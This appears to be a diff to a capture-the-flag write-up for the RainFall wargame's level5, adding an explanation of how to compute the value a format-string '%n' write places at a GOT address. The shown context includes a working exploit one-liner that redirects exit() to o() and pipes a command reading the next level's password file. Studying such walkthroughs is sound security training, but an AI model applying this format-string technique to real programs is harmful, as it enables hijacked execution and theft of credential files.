@@ -49,6 +49,8 @@ End of assembler dump.
    0x080484ff <+61>:	call   0x80483d0 <exit@plt>
 ```
 As described in level4, there are two method to write arbitrary data to potentially carefully-selected address - overwrite `exit()`'s address by `o()`'s address.
+
+To `%n` writes value `0x080484a4` into `0x08049838`, first convert it to decimal which gives 134513828 and subtract 4 as 4 bytes are written by address itself.
 ```shell
 level5@RainFall:~$ (python -c 'print "\x38\x98\x04\x08" + "%0134513824x%4$n"'; echo "cat /home/user/level6/.pass") | ./level5
 000000000000000000000000000000000000000000000000000000000000000[...]000000000000000000000000000000000000000200
